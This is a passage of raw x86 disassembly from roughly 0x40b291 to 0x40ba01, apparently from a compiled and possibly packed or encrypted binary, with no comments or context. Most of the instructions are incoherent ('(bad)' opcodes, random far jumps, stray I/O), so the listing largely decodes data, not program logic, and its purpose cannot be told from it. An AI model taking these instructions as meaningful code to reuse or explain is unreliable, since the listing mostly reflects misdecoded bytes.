  40b291:	push   ecx
  40b292:	ficom  WORD PTR [ebx-0x67e5e986]
  40b298:	jle    0x40b23e
  40b29a:	lods   eax,DWORD PTR ds:[esi]
  40b29b:	(bad)  
  40b29c:	mov    ch,0x6a
  40b29e:	lds    ecx,FWORD PTR [edi-0x1c4527d4]
  40b2a4:	mov    bl,0x1
  40b2a6:	enter  0x57d9,0x57
  40b2aa:	add    BYTE PTR ds:0x6049b65c,bl
  40b2b0:	fs (bad) 
  40b2b2:	dec    eax
  40b2b3:	push   ss
  40b2b4:	iret   
  40b2b5:	dec    ebx
  40b2b6:	jnp    0x40b31a
  40b2b8:	xchg   edi,eax
  40b2b9:	xor    al,BYTE PTR [ebx+0x6dd0d600]
  40b2bf:	sub    BYTE PTR [ebp-0x21],dl
  40b2c2:	push   0x16d35bba
  40b2c7:	pop    es
  40b2c8:	or     ebx,DWORD PTR [edi]
  40b2ca:	inc    edi
  40b2cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2cc:	dec    edx
  40b2cd:	and    ecx,DWORD PTR [ebp-0x54]
  40b2d0:	xor    eax,edi
  40b2d2:	xor    edx,edx
  40b2d4:	or     eax,edx
  40b2d6:	lea    eax,[ebp+eax*1-0x4]
  40b2da:	jmp    0x40b864
  40b2df:	dec    esp
  40b2e0:	outs   dx,DWORD PTR ds:[esi]
  40b2e1:	cdq    
  40b2e2:	js     0x40b27c
  40b2e4:	cmp    BYTE PTR [ebx+edx*1],ch
  40b2e7:	mov    ah,0x21
  40b2e9:	mov    al,0xae
  40b2eb:	jno    0x40b28b
  40b2ed:	pop    esp
  40b2ee:	outs   dx,BYTE PTR ds:[esi]
  40b2ef:	mov    edx,0x3d1616ff
  40b2f4:	add    al,0x16
  40b2f6:	push   ss
  40b2f7:	push   0x39
  40b2f9:	pop    ss
  40b2fa:	ss aad 0xb0
  40b2fd:	inc    edx
  40b2fe:	push   esp
  40b2ff:	test   al,0x17
  40b301:	out    dx,eax
  40b302:	jb     0x40b2ac
  40b304:	inc    esi
  40b305:	(bad)  
  40b307:	mov    ebx,0x24126f83
  40b30c:	add    al,0x66
  40b30e:	test   BYTE PTR [eax+esi*1+0x38ee84cc],0xa9
  40b316:	jb     0x40b319
  40b318:	icebp  
  40b319:	adc    BYTE PTR [ebp+0x39],ah
  40b31c:	dec    esp
  40b31d:	inc    eax
  40b31e:	xchg   ecx,eax
  40b31f:	in     al,dx
  40b320:	je     0x40b32f
  40b322:	sub    edi,edi
  40b324:	scas   al,BYTE PTR es:[edi]
  40b325:	loop   0x40b2ea
  40b327:	test   BYTE PTR [ebp-0x4d881fab],ah
  40b32d:	arpl   di,bx
  40b32f:	out    0xb1,eax
  40b331:	cdq    
  40b332:	xchg   ebx,eax
  40b333:	sub    cl,ah
  40b335:	shl    esi,1
  40b337:	adc    dl,BYTE PTR [esi+ebx*2]
  40b33a:	es mov al,bl
  40b33d:	xchg   ebx,eax
  40b33e:	add    dh,BYTE PTR [edx-0x4bf0d9f1]
  40b344:	aam    0x52
  40b346:	xlat   BYTE PTR ds:[ebx]
  40b347:	int    0xf4
  40b349:	test   al,0xe7
  40b34b:	into   
  40b34c:	pop    ecx
  40b34d:	jbe    0x40b3a7
  40b34f:	test   BYTE PTR [ecx],0x13
  40b352:	test   eax,0x4e51523a
  40b357:	pop    esi
  40b358:	push   ebx
  40b359:	mov    ecx,0xc2056210
  40b35e:	jge    0x40b38d
  40b360:	(bad)  
  40b361:	fdivr  st(2),st
  40b363:	in     al,dx
  40b364:	into   
  40b365:	sahf   
  40b366:	sbb    BYTE PTR [edx],dh
  40b368:	repnz mov ecx,0xe6f46583
  40b36e:	mov    DWORD PTR ds:0xf3d73e41,ebp
  40b374:	test   eax,0x4202deae
  40b379:	cdq    
  40b37a:	pop    edi
  40b37b:	mov    bh,0xe2
  40b37d:	popf   
  40b37e:	pop    ebp
  40b37f:	jge    0x40b38e
  40b381:	mov    WORD PTR [edx],es
  40b383:	sti    
  40b384:	xchg   esi,eax
  40b385:	adc    ebx,DWORD PTR [eax-0xbe0259e]
  40b38b:	pop    edi
  40b38c:	pop    ecx
  40b38e:	jmp    0x40b3aa
  40b390:	cs je  0x40b33a
  40b393:	shl    dh,cl
  40b395:	or     edi,DWORD PTR [ecx-0x3d79a9a6]
  40b39b:	cld    
  40b39c:	jl     0x40b3d5
  40b39e:	mov    al,ds:0x9ac0ae96
  40b3a3:	pop    esp
  40b3a4:	xchg   DWORD PTR ds:0x82fed943,edx
  40b3aa:	out    0xe,eax
  40b3ac:	ror    BYTE PTR [ebx-0x34c5e26e],0x86
  40b3b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3b4:	idiv   DWORD PTR [ecx-0x5d55cc9]
  40b3ba:	inc    ebp
  40b3bb:	hlt    
  40b3bc:	fadd   DWORD PTR [ebx-0x69170365]
  40b3c2:	fisttp QWORD PTR [ebx+0x706d1306]
  40b3c8:	cdq    
  40b3c9:	int    0x77
  40b3cb:	stos   DWORD PTR es:[edi],eax
  40b3cc:	inc    ebp
  40b3cd:	repz jns 0x40b414
  40b3d0:	pop    ecx
  40b3d1:	sbb    DWORD PTR [esi-0x55],eax
  40b3d4:	and    eax,0xdb414bd
  40b3d9:	sbb    al,0x59
  40b3db:	test   eax,0xaabbdb3
  40b3e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3e1:	aad    0xa4
  40b3e3:	add    bh,BYTE PTR [edx+edx*8+0x3f6529b8]
  40b3ea:	test   al,0xb6
  40b3ec:	mov    dh,0xe0
  40b3ee:	stc    
  40b3ef:	sbb    bl,BYTE PTR [esi-0x10]
  40b3f2:	jnp    0x40b388
  40b3f4:	xor    al,0x2c
  40b3f6:	cmp    eax,0x735b2dbc
  40b3fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3fc:	inc    eax
  40b3fd:	mov    ah,BYTE PTR [edx+ebp*8-0x70040f3d]
  40b404:	adc    DWORD PTR [esi+ebx*2+0x21278806],0xffffff9b
  40b40c:	mov    ds:0x75a41377,eax
  40b411:	in     eax,dx
  40b412:	adc    dl,al
  40b414:	mov    ebx,0xb9e42303
  40b419:	push   cs
  40b41a:	fidiv  DWORD PTR [ebp+0x7]
  40b41d:	sbb    cl,BYTE PTR [ecx+0x3f]
  40b420:	xor    BYTE PTR [edi-0x6d7a355d],al
  40b426:	(bad)
  40b429:	jmp    0xdb91:0xd12b9083
  40b430:	pop    edi
  40b431:	and    ecx,DWORD PTR [edx+0x27]
  40b434:	pop    esp
  40b435:	mov    ecx,0x4c33753c
  40b43a:	or     dh,dh
  40b43c:	jmp    DWORD PTR [edi+0x309edc18]
  40b442:	jno    0x40b494
  40b444:	sub    DWORD PTR [esi],edi
  40b446:	dec    ecx
  40b447:	and    cl,BYTE PTR [esi+0x484fc13a]
  40b44d:	mov    edx,0xde3dbfeb
  40b452:	fcom   DWORD PTR [ebx]
  40b454:	adc    eax,0x53ba7297
  40b459:	(bad)  
  40b45a:	into   
  40b45b:	mov    DWORD PTR [edx-0x30357bab],edx
  40b461:	xor    DWORD PTR [edx-0x3a6ea6e4],ebp
  40b467:	or     BYTE PTR [ecx],cl
  40b469:	std    
  40b46a:	mov    ds:0xfc734505,al
  40b46f:	stos   DWORD PTR es:[edi],eax
  40b470:	lock mov ds:0x4b587c3a,al
  40b476:	sub    bl,dl
  40b478:	jo     0x40b4f3
  40b47a:	fild   QWORD PTR [ecx+0x7ef23542]
  40b480:	push   ecx
  40b481:	not    cl
  40b483:	aad    0xe8
  40b485:	mov    bl,0x39
  40b487:	mov    dl,0xea
  40b489:	pop    esi
  40b48a:	packuswb mm1,mm2
  40b48d:	pop    es
  40b48e:	push   cs
  40b48f:	inc    ebp
  40b490:	mov    cl,0x41
  40b492:	scas   al,BYTE PTR es:[edi]
  40b493:	push   eax
  40b494:	in     al,0x1
  40b496:	or     esi,ebx
  40b498:	mov    bh,0xfc
  40b49a:	or     edx,DWORD PTR [esi-0x2486c4ea]
  40b4a0:	scas   al,BYTE PTR es:[edi]
  40b4a1:	add    BYTE PTR [ecx],al
  40b4a3:	add    DWORD PTR [edx+0x1c79cc7f],ebp
  40b4a9:	push   ss
  40b4aa:	pop    edx
  40b4ab:	and    eax,0xce8713bc
  40b4b0:	lahf   
  40b4b1:	mov    cl,0x11
  40b4b3:	and    bl,BYTE PTR [eax]
  40b4b5:	enter  0x3aa4,0xdb
  40b4b9:	(bad)  
  40b4ba:	jmp    0x40b4f7
  40b4bc:	and    dh,dl
  40b4be:	outs   dx,DWORD PTR ds:[esi]
  40b4bf:	fdiv   QWORD PTR [di+0x45e8]
  40b4c4:	std    
  40b4c5:	or     eax,0x2bdc713d
  40b4ca:	mov    cl,0x3
  40b4cc:	pop    ds
  40b4cd:	xor    BYTE PTR [ebp+0x30],ch
  40b4d0:	loopne 0x40b4d7
  40b4d2:	add    DWORD PTR [ebx],0x21
  40b4d5:	dec    ecx
  40b4d6:	adc    eax,0x846caec0
  40b4db:	mov    dh,0xb6
  40b4dd:	mov    ebp,0x20a7b981
  40b4e2:	or     bh,ch
  40b4e4:	int    0x3f
  40b4e6:	sub    cl,bl
  40b4e8:	xchg   BYTE PTR [edx],cl
  40b4ea:	call   0x99907ed6
  40b4ef:	nop
  40b4f0:	retf   0xdda4
  40b4f3:	sar    ch,cl
  40b4f5:	cmp    al,BYTE PTR [edx+esi*1+0x19]
  40b4f9:	pop    ebp
  40b4fa:	or     eax,0xdc756e0f
  40b4ff:	aas    
  40b500:	jne    0x40b4ea
  40b502:	(bad)  
  40b504:	nop
  40b505:	sub    eax,0xe11a99a4
  40b50a:	int3   
  40b50b:	sub    eax,0x7a7b9a0e
  40b510:	xor    BYTE PTR [ecx-0x6d6f3bbd],bl
  40b516:	mov    ah,0x55
  40b518:	idiv   bh
  40b51a:	scas   al,BYTE PTR es:[edi]
  40b51b:	push   esi
  40b51c:	xor    ecx,esi
  40b51e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b51f:	push   eax
  40b520:	imul   ebx,DWORD PTR [eax+0xb],0xebca71a
  40b527:	sbb    eax,0x7403bd82
  40b52c:	rol    BYTE PTR [edx+0x5f],0xa7
  40b530:	cmp    BYTE PTR [esi+0x37],0xbf
  40b534:	loopne 0x40b543
  40b536:	pop    ebx
  40b537:	stos   DWORD PTR es:[edi],eax
  40b538:	fbld   TBYTE PTR ds:0xc40d5b42
  40b53e:	mov    esi,0x68606508
  40b543:	xchg   cl,dl
  40b545:	in     al,0xaf
  40b547:	ins    DWORD PTR es:[edi],dx
  40b548:	dec    edi
  40b549:	or     al,0xf8
  40b54b:	and    eax,0x1def98ef
  40b550:	fist   DWORD PTR [esp]
  40b553:	mov    cl,0x16
  40b555:	cmp    dh,BYTE PTR es:[esi-0x4a24aa07]
  40b55c:	sub    BYTE PTR [ebx-0x1b18419],bl
  40b562:	out    dx,eax
  40b563:	punpckhwd mm1,mm0
  40b566:	push   eax
  40b567:	xor    DWORD PTR [ecx-0x313baaed],ebx
  40b56d:	push   ebx
  40b56e:	jle    0x40b5da
  40b570:	repnz mov ebx,0xc39804a
  40b576:	jns    0x40b589
  40b578:	lock loopne 0x40b57d
  40b57b:	mov    ds:0xa8a2c74d,al
  40b580:	or     ebp,DWORD PTR [ecx]
  40b582:	mul    dh
  40b584:	adc    esi,esi
  40b586:	mov    ch,dl
  40b588:	or     BYTE PTR [ebx],0x65
  40b58b:	inc    esp
  40b58c:	icebp  
  40b58d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b58e:	sbb    al,0x1e
  40b590:	retf   
  40b591:	inc    ebp
  40b592:	stc    
  40b593:	mov    ebp,0x8b82fc29
  40b598:	leave  
  40b599:	mov    WORD PTR [ecx],ss
  40b59b:	fidiv  DWORD PTR [edx+0x32e32f2f]
  40b5a1:	retf   
  40b5a2:	mov    bh,0xb5
  40b5a4:	scas   al,BYTE PTR es:[edi]
  40b5a5:	ja     0x40b5c2
  40b5a7:	icebp  
  40b5a8:	fbstp  TBYTE PTR [edx]
  40b5aa:	cmp    edx,DWORD PTR [edx+0x2623fec6]
  40b5b0:	pop    ss
  40b5b1:	sbb    ecx,DWORD PTR [edi+esi*2+0x56]
  40b5b5:	cmp    bl,dh
  40b5b7:	jnp    0x40b633
  40b5b9:	pop    es
  40b5ba:	mov    ah,0x2b
  40b5bc:	push   esp
  40b5bd:	aaa    
  40b5be:	push   ebp
  40b5bf:	mov    bl,0x77
  40b5c1:	adc    edi,DWORD PTR [edx-0x4a5d56f]
  40b5c7:	enterw 0xa85a,0x3a
  40b5cc:	ins    BYTE PTR es:[edi],dx
  40b5cd:	ins    BYTE PTR es:[edi],dx
  40b5ce:	mov    ah,0xaf
  40b5d0:	mov    bh,0x89
  40b5d2:	xchg   edx,eax
  40b5d3:	ins    DWORD PTR es:[edi],dx
  40b5d4:	and    DWORD PTR [ecx+0x69],0xffffffef
  40b5d8:	call   0x9447:0x8140a9e3
  40b5df:	test   DWORD PTR [esi-0x28],ebp
  40b5e2:	mov    bh,0xac
  40b5e4:	mov    ecx,0x1a13d89b
  40b5e9:	push   DWORD PTR [esi]
  40b5eb:	imul   edx,esi,0xffffff81
  40b5ee:	jbe    0x40b61f
  40b5f0:	add    eax,0x8ba1fc84
  40b5f5:	int3   
  40b5f6:	(bad)  
  40b5f7:	lods   eax,DWORD PTR ds:[esi]
  40b5f8:	shr    DWORD PTR ds:0xd44c89c4,cl
  40b5fe:	inc    ebp
  40b5ff:	bound  edi,QWORD PTR [eax-0x79]
  40b602:	mov    ebp,0xf32e59f8
  40b607:	je     0x40b5b8
  40b609:	mov    ch,0xa7
  40b60b:	mov    ecx,0x41ec7b9e
  40b610:	in     al,dx
  40b611:	xor    DWORD PTR [ecx+0x4d02f687],eax
  40b617:	call   0x3fcca2a4
  40b61c:	jbe    0x40b617
  40b61e:	xchg   ebx,eax
  40b61f:	aad    0x21
  40b621:	sub    eax,0x99a2e528
  40b626:	std    
  40b627:	jne    0x40b5f3
  40b629:	test   BYTE PTR [ebp-0x673a3be5],al
  40b62f:	sub    cl,BYTE PTR [ecx-0x4227456d]
  40b635:	not    DWORD PTR [edi+0x5c932aea]
  40b63b:	or     al,BYTE PTR [eax-0x41a4efd0]
  40b641:	outs   dx,BYTE PTR ds:[esi]
  40b642:	xor    bh,BYTE PTR es:0xcaa87e2e
  40b649:	fbld   TBYTE PTR [edx+0x5e133cfd]
  40b64f:	stos   DWORD PTR es:[edi],eax
  40b650:	pop    ebp
  40b651:	lods   eax,DWORD PTR ds:[esi]
  40b652:	dec    ecx
  40b653:	jbe    0x40b609
  40b655:	lods   eax,DWORD PTR ds:[esi]
  40b656:	dec    esi
  40b657:	retf   
  40b658:	icebp  
  40b659:	test   al,0xb2
  40b65b:	int3   
  40b65c:	scas   al,BYTE PTR es:[edi]
  40b65d:	je     0x40b5f2
  40b65f:	call   0x12a5e37a
  40b664:	sahf   
  40b665:	mov    DWORD PTR [edi-0x5b],esi
  40b668:	js     0x40b6af
  40b66a:	or     DWORD PTR [eax],edi
  40b66c:	cmp    al,BYTE PTR [ecx-0x548240b8]
  40b672:	test   BYTE PTR [ebx-0x1a],dl
  40b675:	push   ebp
  40b676:	sbb    al,0xd6
  40b678:	mov    esp,0x6317ffd3
  40b67d:	fst    QWORD PTR [edx]
  40b67f:	nop
  40b680:	lahf   
  40b681:	or     DWORD PTR [ecx+0xe607445],ebx
  40b687:	pop    ebp
  40b688:	das    
  40b689:	mov    ch,0x7b
  40b68b:	cld    
  40b68c:	outs   dx,DWORD PTR ds:[esi]
  40b68d:	loop   0x40b63a
  40b68f:	pop    ss
  40b690:	push   0x7b27a6bb
  40b695:	(bad)  
  40b696:	arpl   WORD PTR [ebp+0x1a],si
  40b699:	mov    edi,0x6e48d253
  40b69e:	call   0x1af5:0xa4420219
  40b6a5:	test   DWORD PTR [ebx+0x6],edx
  40b6a8:	pop    es
  40b6a9:	cmp    BYTE PTR [edi-0x4b43408],cl
  40b6af:	and    eax,0xd7cd8410
  40b6b4:	cmp    ebx,eax
  40b6b6:	or     bh,cl
  40b6b8:	mov    dh,0x42
  40b6ba:	std    
  40b6bb:	daa    
  40b6bc:	sub    dl,0x3f
  40b6bf:	fcomp  QWORD PTR [eax-0x814ff4]
  40b6c5:	push   cs
  40b6c6:	jmp    0xc64a:0xcce35fc9
  40b6cd:	test   DWORD PTR [edi],eax
  40b6cf:	adc    BYTE PTR [eax+0x55323e98],dh
  40b6d5:	lea    ebx,[edi+0x69]
  40b6d8:	push   esp
  40b6d9:	test   al,0xff
  40b6db:	out    0x7e,al
  40b6dd:	outs   dx,BYTE PTR ds:[esi]
  40b6de:	daa    
  40b6df:	sti    
  40b6e0:	sub    eax,0x8f03f1c7
  40b6e5:	jnp    0x40b730
  40b6e7:	pop    ecx
  40b6e8:	jg     0x40b745
  40b6ea:	test   BYTE PTR ds:0xaf07cb89,bl
  40b6f0:	push   ecx
  40b6f1:	or     BYTE PTR [edx+0x9],bl
  40b6f4:	bound  ebp,QWORD PTR [ebx]
  40b6f6:	jae    0x40b70f
  40b6f8:	adc    BYTE PTR [eax],al
  40b6fa:	mov    WORD PTR [esi],gs
  40b6fc:	jmp    0xdb12:0xf8c58ed1
  40b703:	mov    bl,0x3b
  40b705:	cld    
  40b706:	jge    0x40b75e
  40b708:	pop    esp
  40b709:	ret    0xcb1a
  40b70c:	xlat   BYTE PTR ds:[ebx]
  40b70d:	(bad)  
  40b70e:	cmp    esp,eax
  40b710:	stc    
  40b711:	out    dx,eax
  40b712:	push   ebx
  40b713:	aad    0xb4
  40b715:	cwde   
  40b716:	enter  0x3d1a,0xc6
  40b71a:	cld    
  40b71b:	mov    ebp,0xcd35203e
  40b720:	popf   
  40b721:	pop    esp
  40b722:	sbb    al,0x21
  40b724:	cmp    edi,DWORD PTR [edx-0xddfc446]
  40b72a:	aam    0x3f
  40b72c:	xchg   ebx,eax
  40b72d:	les    ebx,FWORD PTR [edx-0x5e]
  40b730:	jle    0x40b77c
  40b732:	ss fsubrp st(2),st
  40b735:	push   esi
  40b736:	out    0xc8,al
  40b738:	jmp    0x1c6b:0xf70a048e
  40b73f:	push   ebx
  40b740:	imul   edi,DWORD PTR [edi],0xdb43202b
  40b746:	xchg   ebp,eax
  40b747:	(bad)  
  40b749:	xor    al,0x6b
  40b74b:	icebp  
  40b74c:	sti    
  40b74d:	xchg   esp,eax
  40b74e:	retf   
  40b74f:	mov    ebx,0x2846f2ae
  40b754:	(bad)  
  40b755:	(bad)  
  40b756:	push   edx
  40b757:	mov    ah,bh
  40b759:	mov    al,0x7a
  40b75b:	xor    BYTE PTR [edx-0xb608c8],0x19
  40b762:	push   0x5b
  40b764:	inc    ecx
  40b765:	dec    bl
  40b767:	and    bh,BYTE PTR [eax]
  40b769:	imul   edi,DWORD PTR [eax+0x4d],0xffffffd2
  40b76d:	scas   al,BYTE PTR es:[edi]
  40b76e:	jo     0x40b6f9
  40b770:	aas    
  40b771:	sbb    al,0x50
  40b773:	xchg   DWORD PTR [edx],eax
  40b775:	pop    eax
  40b776:	(bad)  [eax]
  40b778:	jae    0x40b77c
  40b77a:	cmp    BYTE PTR [ebx-0x77a1439e],ch
  40b780:	pop    edx
  40b781:	xor    esp,DWORD PTR [edi+eiz*8]
  40b784:	push   0xffffffe9
  40b786:	ds add eax,0x367a293b
  40b78c:	inc    esp
  40b78d:	adc    DWORD PTR [edx-0x22],ebx
  40b790:	fmul   DWORD PTR [eax+0x57c4ca1]
  40b796:	jle    0x40b7b6
  40b798:	retf   
  40b799:	cmp    al,0x71
  40b79b:	loopne 0x40b754
  40b79d:	test   eax,0x4d15963e
  40b7a2:	jecxz  0x40b814
  40b7a4:	xchg   edi,eax
  40b7a5:	pop    edi
  40b7a6:	(bad)  
  40b7a7:	sbb    bh,BYTE PTR [eax+0x48]
  40b7aa:	cmp    ebp,DWORD PTR [esi+0x7a9c1ca7]
  40b7b0:	mov    BYTE PTR [ebx],cl
  40b7b2:	call   DWORD PTR [ebx]
  40b7b4:	cmp    ah,BYTE PTR [eax-0x5e7eec01]
  40b7ba:	mov    bh,0x88
  40b7bc:	push   esp
  40b7bd:	ret    0x964a
  40b7c0:	in     al,0xc6
  40b7c2:	xchg   edx,eax
  40b7c3:	das    
  40b7c4:	xchg   BYTE PTR [eax],dh
  40b7c6:	shl    BYTE PTR ds:0xf6aa7d9,cl
  40b7cc:	push   ss
  40b7cd:	in     eax,0x2f
  40b7cf:	add    al,0x36
  40b7d1:	fucomi st,st(5)
  40b7d3:	ss dec ecx
  40b7d5:	out    0x64,al
  40b7d7:	enter  0x5f76,0xb3
  40b7db:	inc    edi
  40b7dc:	add    BYTE PTR [esi],ah
  40b7de:	sub    al,0xd5
  40b7e0:	outs   dx,DWORD PTR ds:[esi]
  40b7e1:	mov    dh,0xde
  40b7e3:	dec    ecx
  40b7e4:	xchg   esi,eax
  40b7e5:	mov    esi,0xe891893e
  40b7ea:	out    0x6a,al
  40b7ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7ed:	jmp    0x40b7a8
  40b7ef:	ins    BYTE PTR es:[edi],dx
  40b7f0:	cdq    
  40b7f1:	inc    edx
  40b7f2:	jecxz  0x40b7a8
  40b7f4:	pop    eax
  40b7f5:	jg     0x40b7b5
  40b7f7:	add    ch,BYTE PTR fs:[eax-0x5da72cc8]
  40b7fe:	cmp    bl,ch
  40b800:	push   edx
  40b801:	inc    eax
  40b802:	cli    
  40b803:	(bad)  
  40b804:	stos   BYTE PTR es:[edi],al
  40b805:	pop    ebp
  40b806:	and    DWORD PTR [edx+ebp*1],ecx
  40b809:	out    0xad,eax
  40b80b:	push   esp
  40b80c:	adc    al,0x91
  40b80e:	repz adc ebx,esp
  40b811:	jb     0x40b805
  40b813:	pop    WORD PTR [esp+eiz*4-0x28fb9ab7]
  40b81b:	inc    edx
  40b81c:	fdiv   st(1),st
  40b81e:	cs dec ecx
  40b820:	(bad)  
  40b821:	fidivr DWORD PTR [ecx+ebx*8+0x24]
  40b825:	enter  0xb5d3,0xce
  40b829:	pushf  
  40b82a:	inc    esi
  40b82b:	xchg   edx,eax
  40b82c:	repz mov ds:0x61bfa6ad,al
  40b832:	mov    WORD PTR [edi-0x2bb92571],?
  40b838:	int3   
  40b839:	and    eax,0xe4e383d6
  40b83e:	and    cl,BYTE PTR [si-0x62]
  40b842:	adc    ah,BYTE PTR [esi+0x2c3ca52a]
  40b848:	mov    bl,0x82
  40b84a:	fcom   DWORD PTR cs:[eax*1+0x1b7b6e70]
  40b852:	lahf   
  40b853:	mov    bl,0xb9
  40b855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b856:	fild   DWORD PTR [esi+edx*8]
  40b859:	pop    edi
  40b85a:	cmp    al,BYTE PTR [eax+eax*2-0x6b]
  40b85e:	xor    esp,edi
  40b860:	xor    al,0x39
  40b862:	or     esi,edx
  40b864:	mov    DWORD PTR [ebp-0x34],eax
  40b867:	mov    eax,DWORD PTR [ebp-0x60]
  40b86a:	shl    ecx,0x1e
  40b86d:	mov    ecx,DWORD PTR [ebp-0x5c]
  40b870:	jmp    0x40bdfa
  40b875:	retf   
  40b876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b877:	cli    
  40b878:	jo     0x40b852
  40b87a:	sbb    BYTE PTR [eax],ah
  40b87c:	and    al,0xe8
  40b87e:	ins    BYTE PTR es:[edi],dx
  40b87f:	mov    ah,0x72
  40b881:	inc    esp
  40b882:	dec    eax
  40b883:	mov    ch,BYTE PTR [esi-0x10]
  40b886:	jmp    0x40b89e
  40b888:	push   ss
  40b889:	cmp    eax,0xfa161604
  40b88e:	or     al,0x34
  40b890:	ss pop esi
  40b892:	lahf   
  40b893:	fisub  WORD PTR [eax]
  40b895:	dec    edx
  40b896:	(bad)  [ecx]
  40b898:	sahf   
  40b899:	jp     0x40b81f
  40b89b:	cmp    eax,0x95997961
  40b8a0:	into   
  40b8a1:	xchg   BYTE PTR [ebp+0x2615fe3d],bh
  40b8a7:	mov    ds:0xf75a3cc,al
  40b8ac:	lods   eax,DWORD PTR ds:[esi]
  40b8ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8ae:	retf   0x9b2e
  40b8b1:	cld    
  40b8b2:	xchg   ecx,eax
  40b8b3:	ret    
  40b8b4:	adc    eax,DWORD PTR [ebp-0x21]
  40b8b7:	xor    BYTE PTR [edi+ebp*4-0x5d],ch
  40b8bb:	xor    BYTE PTR ds:0xfcf22805,bh
  40b8c1:	out    dx,eax
  40b8c2:	mov    cs,esi
  40b8c4:	std    
  40b8c5:	cwde   
  40b8c6:	je     0x40b8b9
  40b8c8:	es daa 
  40b8ca:	push   ecx
  40b8cb:	jae    0x40b91d
  40b8cd:	mov    ecx,0xcb4c9c0b
  40b8d2:	(bad)  
  40b8d3:	ins    BYTE PTR es:[edi],dx
  40b8d4:	hlt    
  40b8d5:	arpl   WORD PTR [esi],di
  40b8d7:	adc    eax,0xc19c4076
  40b8dc:	or     ebp,DWORD PTR [eax+0x4de480e2]
  40b8e2:	sbb    cl,0x26
  40b8e5:	fsub   QWORD PTR [eax+eax*1-0x760a69e6]
  40b8ec:	in     eax,0x9c
  40b8ee:	cwde   
  40b8ef:	(bad)  
  40b8f0:	call   0xf9cd:0xecd01bae
  40b8f7:	push   ebx
  40b8f8:	in     eax,dx
  40b8f9:	sbb    esi,DWORD PTR [ecx-0x61]
  40b8fc:	out    dx,eax
  40b8fd:	add    BYTE PTR [ecx+esi*1-0x26],dh
  40b901:	inc    ecx
  40b902:	mov    ?,WORD PTR [edi-0x38ba048c]
  40b908:	jbe    0x40b927
  40b90a:	retf   0xe260
  40b90d:	cdq    
  40b90e:	sbb    edi,eax
  40b910:	sub    cl,BYTE PTR [esp+edx*1]
  40b913:	dec    edx
  40b914:	mov    ebx,0xfbaa3270
  40b919:	jns    0x40b981
  40b91b:	bound  esi,QWORD PTR [eax-0x3a]
  40b91e:	or     eax,0x5e2f04c4
  40b923:	sar    DWORD PTR [edx-0x46862895],cl
  40b929:	js     0x40b91d
  40b92b:	test   ebp,0xb9576583
  40b931:	lahf   
  40b932:	call   0x10ea:0xa82692b9
  40b939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b93a:	dec    eax
  40b93b:	hlt    
  40b93c:	add    edx,DWORD PTR [eax+eiz*8-0x4acd63aa]
  40b943:	mov    cl,BYTE PTR [ebx]
  40b945:	repz pop eax
  40b947:	pop    ss
  40b948:	xchg   edx,eax
  40b949:	cmp    al,BYTE PTR [ebp-0x1a]
  40b94c:	sbb    edx,DWORD PTR [ebx-0x6c1dd6a8]
  40b952:	cmp    ebx,DWORD PTR [edx+0x45e0c75d]
  40b958:	das    
  40b959:	enter  0x56c7,0x56
  40b95d:	repnz sub BYTE PTR [edx-0x3d],ah
  40b961:	ss mov edx,ebp
  40b964:	lods   al,BYTE PTR ds:[esi]
  40b965:	mov    ss,WORD PTR [edx-0x6330fb0c]
  40b96b:	mov    al,ds:0xb4043b67
  40b970:	fdiv   DWORD PTR [ecx]
  40b972:	pop    esi
  40b973:	hlt    
  40b974:	fsub   DWORD PTR [ecx]
  40b976:	leave  
  40b977:	xchg   edx,eax
  40b978:	sar    DWORD PTR [edx],cl
  40b97a:	mov    al,BYTE PTR [esi]
  40b97c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b97d:	jo     0x40b9dd
  40b97f:	test   al,0x2f
  40b981:	xchg   BYTE PTR [ebp-0x11],ch
  40b984:	fwait
  40b985:	aaa    
  40b986:	loop   0x40b962
  40b988:	lea    esp,[ecx-0x1a1e6172]
  40b98e:	stos   BYTE PTR es:[edi],al
  40b98f:	cmp    eax,0xe190d649
  40b994:	pop    ss
  40b995:	adc    dh,BYTE PTR [esi-0x62]
  40b998:	inc    ebp
  40b999:	dec    esi
  40b99a:	in     al,dx
  40b99b:	mov    ecx,0x6796af34
  40b9a0:	stos   BYTE PTR es:[edi],al
  40b9a1:	lock push ss
  40b9a3:	cwde   
  40b9a4:	les    esp,FWORD PTR [esi]
  40b9a6:	sub    ecx,DWORD PTR [edx+0xd3899a5]
  40b9ac:	inc    esi
  40b9ad:	ret    0x1f0b
  40b9b0:	jne    0x40b9cb
  40b9b2:	sbb    al,0xd9
  40b9b4:	sti    
  40b9b5:	mov    DWORD PTR [ecx-0x29],0x67ce472e
  40b9bc:	scas   al,BYTE PTR es:[edi]
  40b9bd:	add    BYTE PTR [esi+0x66],dl
  40b9c0:	stos   BYTE PTR es:[edi],al
  40b9c1:	outs   dx,BYTE PTR ds:[esi]
  40b9c2:	loop   0x40b9e0
  40b9c4:	jbe    0x40b95f
  40b9c6:	xchg   edi,eax
  40b9c7:	xchg   ebx,eax
  40b9c8:	sbb    eax,DWORD PTR [edx+0x4]
  40b9cb:	and    ah,BYTE PTR [ebx+0x37d0bc5a]
  40b9d1:	(bad)  
  40b9d3:	dec    esi
  40b9d4:	push   esi
  40b9d5:	sub    dl,bh
  40b9d7:	mov    DWORD PTR [edx+edx*1+0x74f2ea4e],esp
  40b9de:	cld    
  40b9df:	retf   
  40b9e0:	fsubr  st(6),st
  40b9e2:	nop
  40b9e3:	and    eax,0x57f626f0
  40b9e8:	mov    al,ds:0x82757bdf
  40b9ed:	rol    BYTE PTR [edi-0x48a1d738],cl
  40b9f3:	xor    ebx,DWORD PTR [ebx+0x5c]
  40b9f6:	retf   0xb585
  40b9f9:	gs retf 
  40b9fb:	lea    ecx,[edx-0x40]
  40b9fe:	xor    al,0x87
  40ba00:	retf   
  40ba01:	or     DWORD PTR [eax+0x17f07c18],esp
